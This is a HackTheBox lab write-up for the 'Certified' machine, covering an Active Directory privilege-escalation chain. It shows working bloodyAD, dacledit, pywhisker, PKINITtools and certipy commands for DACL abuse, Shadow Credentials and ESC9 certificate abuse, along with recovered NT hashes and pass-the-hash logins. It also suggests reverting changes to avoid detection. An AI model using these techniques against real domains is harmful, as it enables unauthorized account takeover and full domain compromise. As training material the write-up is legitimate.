---
title: "HTB-Certified-Medium"
date: "2025-11-26"
platform: "HackTheBox"
category: "Windows Active Directory"
difficulty: "Medium"
tags: [
  "WriteOwner Abuse",
  "DACL Manipulation",
  "Shadow Credentials",
  "msDS-KeyCredentialLink",
  "PKINIT",
  "ADCS",
  "ESC9",
  "UPN Manipulation",
  "BloodHound",
  "pywhisker",
  "PKINITtools",
  "Kerberos",
  "Privilege Escalation",
  "Certificate Authentication",
  "Pass-the-Hash",
  "Impacket"
]
excerpt: "A multi-stage AD attack chain starting from WriteOwner abuse, escalating through Shadow Credentials attacks on multiple accounts, discovering an ESC9 vulnerability in ADCS, and finally manipulating certificate mapping to obtain an Administrator certificate and full domain compromise."
readingTime: 28
featured: true
---


## Initial Access

We start with credentials provided:

```
Username: judith.mader
Password: judith09
```

---

## Reconnaissance - BloodHound Analysis

After running BloodHound enumeration, we discover our attack path:

![image](1.png)

**Key Findings:**

- `judith.mader` has **WriteOwner** permissions on the `management` group
- The `management` group has **GenericWrite** on `management_svc` account
- `management_svc` has **GenericWrite** on `ca_operator` account
- This creates a privilege escalation chain! 🎯

---

## Phase 1: Escalating to management Group

### Step 1: Take Ownership of management Group

First, we need to become the owner of the `management` group:

```bash
bloodyAD --host '10.10.11.41' \
  -d 'certified.htb' \
  -u 'judith.mader' \
  -p 'judith09' \
  set owner management judith.mader
```

![image](2.png)

**What this does:**

- Changes the owner of the `management` group to `judith.mader`
- As the owner, we can now modify the group's permissions

### Step 2: Grant Full Control to judith.mader

Now that we own the group, let's grant ourselves full control:

```bash
impacket-dacledit -action 'write' \
  -rights 'FullControl' \
  -inheritance \
  -principal 'judith.mader' \
  -target 'management' \
  "certified.htb"/"judith.mader":'judith09'
```

![image](3.png)

**What this does:**

- Adds an ACE (Access Control Entry) to the group's DACL
- Grants `judith.mader` **FullControl** over the `management` group
- Includes inheritance to apply permissions to child objects

### Step 3: Add judith.mader to management Group

With full control, we can now add ourselves to the group:

```bash
net rpc group addmem "management" "judith.mader" \
  -U "certified.htb"/"judith.mader"%'judith09' \
  -S "dc01.certified.htb"
```

![image](4.png)

**Success!** We're now a member of the `management` group, which has **GenericWrite** on `management_svc`! 🎉

---

## Phase 2: Shadow Credentials Attack on management_svc

### What are Shadow Credentials?

**Shadow Credentials** is a privilege escalation technique that exploits the **Key Trust** model introduced with Windows Hello for Business.

**How it works:**

1. Write a certificate to the target's `msDS-KeyCredentialLink` attribute
2. Use PKINIT (Public Key Cryptography for Initial Authentication) with Kerberos
3. Authenticate and obtain the account's NT hash

**Why this works:**

- Requires **GenericAll**, **GenericWrite**, or **WriteProperty** permissions
- No password cracking needed—we create our own authentication method!
- The certificate acts as a valid credential

### Step 1: Add Shadow Credential with pywhisker

```bash
python3 /opt/ad-tools/pywhisker/pywhisker/pywhisker.py \
  -d 'certified.htb' \
  -u 'judith.mader' \
  -p 'judith09' \
  --target "management_svc" \
  --action "add"
```

**Output:**

```
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: a5be364a-21c9-6604-4100-c13cff124acf
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: hUOqjzDu.pfx
[*] Must be used with password: kju6zhtdJhM8fGYAXiUA
```

**What happened:**

- ✅ Generated a new key pair and certificate
- ✅ Added the public key to `management_svc`'s `msDS-KeyCredentialLink` attribute
- ✅ Saved the private key and certificate as `hUOqjzDu.pfx`
- ✅ PFX password: `kju6zhtdJhM8fGYAXiUA`

### Step 2: Request TGT using PKINIT

Now let's authenticate using our certificate:

```bash
python3 /opt/ad-tools/PKINITtools/gettgtpkinit.py \
  -cert-pfx hUOqjzDu.pfx \
  -pfx-pass 'kju6zhtdJhM8fGYAXiUA' \
  certified.htb/management_svc \
  management_svc.ccache
```

**Output:**

```
2025-11-05 23:30:06,701 minikerberos INFO     Requesting TGT
2025-11-05 23:30:14,130 minikerberos INFO     AS-REP encryption key (you might need this later):
2025-11-05 23:30:14,130 minikerberos INFO     6c9e38e5e0b68ddb6511c383362862e720f644596aaaa2cfe40cd0b6110a27ba
2025-11-05 23:30:14,134 minikerberos INFO     Saved TGT to file
```

**What happened:**

- ✅ Used certificate to authenticate via PKINIT
- ✅ Obtained a valid TGT (Ticket Granting Ticket)
- ✅ Saved to `management_svc.ccache`
- ✅ **Important:** AS-REP encryption key: `6c9e38e5e0b68ddb6511c383362862e720f644596aaaa2cfe40cd0b6110a27ba`

### Step 3: Extract NT Hash

Set the Kerberos cache:

```bash
export KRB5CCNAME=/home/kali/htb/labs/intro_to_zyphr/Certified/management_svc.ccache
```

Extract the NT hash:

```bash
python3 /opt/ad-tools/PKINITtools/getnthash.py \
  -key 6c9e38e5e0b68ddb6511c383362862e720f644596aaaa2cfe40cd0b6110a27ba \
  certified.htb/management_svc
```

**Output:**

```
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

**Compromised Credentials:**

```
Account: management_svc
NT Hash: a091c1832bcdd4677c28b5a6a1295584
```

### Access as management_svc

```bash
evil-winrm -i certified.htb \
  -u management_svc \
  -H a091c1832bcdd4677c28b5a6a1295584
```

**User Flag:** `1f4eae0e5ff16607d2f202c59082a9ca` ✅

---

## Phase 3: Privilege Escalation to ca_operator

### BloodHound Analysis

Checking permissions, we discover:

![image](5.png)

**Key Finding:** `management_svc` has **GenericWrite** on `ca_operator`!

We can repeat the Shadow Credentials attack! 🔄

### Step 1: Add Shadow Credential to ca_operator

```bash
python3 /opt/ad-tools/pywhisker/pywhisker/pywhisker.py \
  -d 'certified.htb' \
  -u 'management_svc' \
  --hashes :a091c1832bcdd4677c28b5a6a1295584 \
  --target "CA_OPERATOR" \
  --action "add"
```

**Output:**

```
[*] Searching for the target account
[*] Target user found: CN=operator ca,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 739fd287-af6e-97e1-ea79-b355008b7364
[*] Updating the msDS-KeyCredentialLink attribute of CA_OPERATOR
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: m2cNdfEg.pfx
[*] Must be used with password: g5lpaZeVTwY47Sqd6odo
```

**Files created:**

- PFX: `m2cNdfEg.pfx`
- Password: `g5lpaZeVTwY47Sqd6odo`

### Step 2: Request TGT for ca_operator

```bash
python3 /opt/ad-tools/PKINITtools/gettgtpkinit.py \
  -cert-pfx m2cNdfEg.pfx \
  -pfx-pass 'g5lpaZeVTwY47Sqd6odo' \
  certified.htb/ca_operator \
  ca_operator.ccache
```

**Output:**

```
2025-11-06 02:47:28,371 minikerberos INFO     Loading certificate and key from file
2025-11-06 02:47:28,405 minikerberos INFO     Requesting TGT
2025-11-06 02:47:32,999 minikerberos INFO     AS-REP encryption key (you might need this later):
2025-11-06 02:47:32,999 minikerberos INFO     604a4d1d312c744e01899ca44f564a33a010a98eeaaa094eedf46cda4135e37a
2025-11-06 02:47:33,006 minikerberos INFO     Saved TGT to file
```

**AS-REP Key:** `604a4d1d312c744e01899ca44f564a33a010a98eeaaa094eedf46cda4135e37a`

### Step 3: Extract NT Hash

```bash
export KRB5CCNAME=/home/kali/htb/labs/intro_to_zyphr/Certified/ca_operator.ccache

python3 /opt/ad-tools/PKINITtools/getnthash.py \
  -key 604a4d1d312c744e01899ca44f564a33a010a98eeaaa094eedf46cda4135e37a \
  certified.htb/ca_operator
```

**Output:**

```
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
b4b86f45c6018f1b664f70805f45d8f2
```

**Compromised Credentials:**

```
Account: ca_operator
NT Hash: b4b86f45c6018f1b664f70805f45d8f2
```

---

## Phase 4: ADCS Enumeration

### Discovering Certificate Services

Let's enumerate ADCS with NetExec:

```bash
nxc ldap certified.htb \
  -u ca_operator \
  -H b4b86f45c6018f1b664f70805f45d8f2 \
  -M adcs
```

![image](6.png)

**Discovery:** Active Directory Certificate Services (ADCS) is running! 🎯

### Enumerating with Certipy

```bash
certipy find \
  -u ca_operator@certified.htb \
  -hashes b4b86f45c6018f1b664f70805f45d8f2 \
  -vulnerable \
  -stdout
```

**Key Findings:**

```
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication ⭐
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
                                          NoSecurityExtension ⚠️
    
    [!] Vulnerabilities
      ESC9                              : Template has no security extension. 🔥
```

**Critical Discovery:** The template is vulnerable to **ESC9**!

---

## Phase 5: ESC9 Exploitation

### What is ESC9?

**ESC9** exploits a flaw in certificate mapping when the **NoSecurityExtension** flag is set:

**The Attack:**

1. Change target user's UPN to match a privileged user (Administrator)
2. Request a certificate with the modified UPN
3. Revert the UPN change
4. Authenticate with the certificate as the privileged user

**Why it works:**

- Certificates without security extensions don't properly validate user identity
- The certificate maps to the **UPN value at request time**
- After changing UPN back, the certificate still works as Administrator

🔗 **Learn More:** [Certificate Mapping - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#certificate-mapping)

### Step 1: Change ca_operator's UPN to Administrator

```bash
certipy account update \
  -username management_svc@certified.htb \
  -hashes 'a091c1832bcdd4677c28b5a6a1295584' \
  -user ca_operator \
  -upn Administrator
```

![image](7.png)

**What this does:**

- Changes `ca_operator`'s User Principal Name (UPN) to `Administrator`
- The certificate will map to this UPN value
- We're using `management_svc` credentials since it has GenericWrite on `ca_operator`

### Step 2: Request Certificate

```bash
certipy req \
  -username ca_operator@certified.htb \
  -hashes 'b4b86f45c6018f1b664f70805f45d8f2' \
  -ca certified-DC01-CA \
  -template CertifiedAuthentication
```

![image](8.png)

**Success!** We've obtained a certificate that will authenticate as **Administrator**!

**Output:**

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is [X]
[*] Got certificate with UPN 'Administrator'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Step 3: Revert UPN Change

Now that we have the certificate, change the UPN back to avoid detection:

```bash
certipy account update \
  -username management_svc@certified.htb \
  -hashes 'a091c1832bcdd4677c28b5a6a1295584' \
  -user ca_operator \
  -upn ca_operator@certified.htb
```

**Why revert?**

- Reduces detection likelihood
- Restores normal account operation
- Certificate still works even after UPN change!

### Step 4: Authenticate as Administrator

```bash
certipy auth \
  -pfx administrator.pfx \
  -domain certified.htb \
  -dc-ip 10.10.11.41
```

**Output:**

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': 
    aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

**Compromised Administrator:**

```
Account: Administrator
NT Hash: 0d5b49608bbce1751f708748f67e2d34
```

---

## Root Flag - Domain Admin Access

```bash
evil-winrm -i certified.htb \
  -u administrator@certified.htb \
  -H '0d5b49608bbce1751f708748f67e2d34'
```

**Root Flag:** `a03920c04f287e040f2a35270a8ba180` 🏆

---

## Attack Chain Summary

```
judith.mader (Initial Access)
  ↓
WriteOwner on management Group
  ↓
Take Ownership → Grant FullControl → Add Self to Group
  ↓
management Group (GenericWrite on management_svc)
  ↓
Shadow Credentials Attack #1
  ↓
management_svc Compromised (NT Hash)
  ↓
GenericWrite on ca_operator
  ↓
Shadow Credentials Attack #2
  ↓
ca_operator Compromised (NT Hash)
  ↓
ADCS Enumeration → ESC9 Discovered
  ↓
Change UPN → Request Certificate → Revert UPN
  ↓
Certificate as Administrator
  ↓
PKINIT Authentication → Administrator NT Hash
  ↓
DOMAIN ADMIN ACCESS! 🎯
```
